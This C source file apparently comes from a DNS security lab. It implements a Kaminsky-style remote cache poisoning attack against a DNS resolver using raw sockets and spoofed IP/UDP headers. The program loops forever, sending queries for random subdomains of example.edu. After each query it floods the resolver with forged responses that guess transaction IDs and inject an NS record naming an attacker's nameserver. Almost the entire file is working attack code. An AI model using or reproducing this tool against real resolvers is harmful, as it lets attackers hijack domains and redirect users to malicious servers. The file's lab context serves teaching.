#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader
{
    unsigned char iph_ihl : 4, iph_ver : 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    // unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};

// UDP header's structure
struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
// total udp header length: 8 bytes (=64 bits)

// DNS header's structure
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears.
struct dataEnd
{
    unsigned short int type;
    unsigned short int class;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2)
    {
        cksum += *usBuff++;
    }
    if (isize == 1)
    {
        cksum += *(uint16_t *)usBuff;
    }

    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum = 0;
    struct ipheader *tempI = (struct ipheader *)(buffer);
    struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    tempH->udph_chksum = 0;

    sum = checksum((uint16_t *)&(tempI->iph_sourceip), 8);
    sum += checksum((uint16_t *)tempH, len);
    sum += ntohs(IPPROTO_UDP + len);
    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
    {
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

int main(int argc, char *argv[])
{
    // This is to check the argc number
    if (argc != 3)
    {
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }

    // buffer to hold the packet
    char buffer[PCKT_LEN];
    char bufferResponse[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    memset(bufferResponse, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

    struct ipheader *ipResponse = (struct ipheader *)bufferResponse;
    struct udpheader *udpResponse = (struct udpheader *)(bufferResponse + sizeof(struct ipheader));
    struct dnsheader *dnsResponse = (struct dnsheader *)(bufferResponse + sizeof(struct ipheader) + sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
    char *dataResponse = (bufferResponse + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    // Construct Query's DNS header

    dns->query_id = rand();     // transaction ID for the query packet, use random number
    dns->flags = htons(FLAG_Q); // the flag you need to set
    dns->QDCOUNT = htons(1);    // only 1 query, so the count should be one.

    // Construct Response's DNS header

    dnsResponse->flags = htons(FLAG_R);
    dnsResponse->QDCOUNT = htons(1);
    dnsResponse->ANCOUNT = htons(1);
    dnsResponse->NSCOUNT = htons(1);
    dnsResponse->ARCOUNT = htons(0);

    // Construct Query's payload

    strcpy(data, "\5aaaaa\7example\3edu"); // query string
    int length = strlen(data) + 1;

    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);

    // Construct Response's payload:

    // 1. QUESTION record: | name | dataEnd(4) |
    char *questionStart = dataResponse;
    strcpy(dataResponse, "\5aaaaa\7example\3edu");
    int lengthResponse = strlen(dataResponse) + 1;

    dataResponse += lengthResponse;
    struct dataEnd *endResponse = (struct dataEnd *)(dataResponse);
    endResponse->type = htons(1); // 2 bytes
    endResponse->class = htons(1);

    // 2. ANSWER record:  | name | dataEnd(4) | ttl(4) | len(2) | ip |
    dataResponse += sizeof(struct dataEnd);
    char *answerStart = dataResponse;
    strcpy(dataResponse, "\5aaaaa\7example\3edu");
    lengthResponse = strlen(dataResponse) + 1;

    dataResponse += lengthResponse;
    endResponse = (struct dataEnd *)(dataResponse);
    endResponse->type = htons(1);  // 2 bytes
    endResponse->class = htons(1); // 2 bytes

    dataResponse += sizeof(struct dataEnd);
    *(long *)dataResponse = htonl(2000); // 4 bytes, ttl = 0x00002000

    dataResponse += sizeof(long);
    *(short int *)dataResponse = htons(4); // 2 bytes, data length = 0x0004

    dataResponse += sizeof(short int);
    *(unsigned int *)dataResponse = inet_addr("1.2.3.4");

    // 3. AUTHORITY record: | name | dataEnd(4) | ttl(4) | len(2) | NS |
    dataResponse += sizeof(unsigned int);
    char *authStart = dataResponse;
    strcpy(dataResponse, "\7example\3edu");
    lengthResponse = strlen(dataResponse) + 1;

    dataResponse += lengthResponse;
    endResponse = (struct dataEnd *)(dataResponse);
    endResponse->type = htons(2);
    endResponse->class = htons(1);

    dataResponse += sizeof(struct dataEnd);
    *(long *)dataResponse = htonl(2000); // 4 bytes, ttl = 0x00002000

    dataResponse += sizeof(long);
    *(short int *)dataResponse = htons(23); // 2 bytes, data length = 0x0013

    dataResponse += sizeof(short int);
    strcpy(dataResponse, "\2ns\16dnslabattacker\3com");
    lengthResponse = strlen(dataResponse) + 1;

    dataResponse += lengthResponse;
    lengthResponse = dataResponse - questionStart;

    //DEBUG:
    printf("\nDEBUG: response = ");
    for (int i = 0; i < dataResponse - questionStart; i++)
    {
        printf("%c", *(questionStart + i));
    }
    printf("\n");

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************8
     Construction of the packet is done. 
    now focus on how to do the settings and send the packet we have composed out
    ***************************************************************************************/

    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;

    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Construct IP header

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ipResponse->iph_ihl = 5;

    ip->iph_ver = 4;
    ipResponse->iph_ver = 4;

    ip->iph_tos = 0; // Low delay
    ipResponse->iph_tos = 0;

    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    unsigned short int packetLengthResponse = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + lengthResponse);

    ip->iph_len = htons(packetLength);
    ipResponse->iph_len = htons(packetLengthResponse);

    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ipResponse->iph_ident = htons(rand());

    ip->iph_ttl = 110; // hops
    ipResponse->iph_ttl = 110;

    ip->iph_protocol = 17; // UDP
    ipResponse->iph_protocol = 17;

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(argv[1]);
    ipResponse->iph_sourceip = inet_addr("199.43.133.53"); //or 199.43.133.53

    // The destination IP address
    ip->iph_destip = inet_addr(argv[2]);
    ipResponse->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(40000 + rand() % 10000); // source port number, I make them random... remember the lower number may be reserved
    udpResponse->udph_srcport = htons(53);

    // Destination port number
    udp->udph_destport = htons(53);
    udpResponse->udph_destport = htons(33333);

    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
    udpResponse->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + lengthResponse);

    // Calculate checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    ipResponse->iph_chksum = csum((unsigned short *)bufferResponse, sizeof(struct ipheader) + sizeof(struct udpheader));
    udpResponse->udph_chksum = check_udp_sum(bufferResponse, packetLengthResponse - sizeof(struct ipheader));

    /*******************************************************************************8
    Tips

    the checksum is quite important to pass the checking integrity. You need 
    to study the algorithem and what part should be taken into the calculation.

    !!!!!If you change anything related to the calculation of the checksum, you need to re-
    calculate it or the packet will be dropped.!!!!!

    Here things became easier since I wrote the checksum function for you. You don't need
    to spend your time writing the right checksum function.
    Just for knowledge purpose,
    remember the seconed parameter
    for UDP checksum:
    ipheader_size + udpheader_size + udpData_size  
    for IP checksum: 
    ipheader_size + udpheader_size
  *********************************************************************************/

    // Create a raw socket with UDP protocol
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0)
        printf("ERROR: socket error\n");

    // Create raw socket
    int one = 1;
    const int *val = &one;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("ERROR: query socket creation error\n");
        exit(-1);
    }

    while (1)
    {
        // xxxx.example.com
        int charnumber = 1 + rand() % 5;
        *(data + charnumber) += 1;                                                        // Set name in query with random string
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // Recalculate checksum for UDP packet

        // Send query packet
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            printf("ERROR: packet send error %d which means %s\n", errno, strerror(errno));
        }

        *(questionStart + charnumber) += 1; // Set name in question record
        *(answerStart + charnumber) += 1;   // Set name in answer record

        for (int i = 0; i < 100; i++)
        {
            dnsResponse->query_id = rand(); // Guess transation ID
            udpResponse->udph_chksum = check_udp_sum(bufferResponse, packetLengthResponse - sizeof(struct ipheader));

            // Send response packet
            if (sendto(sd, bufferResponse, packetLengthResponse, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                printf("ERROR: packet send error %d which means %s\n", errno, strerror(errno));
        }
    }

    close(sd);
    return 0;
}
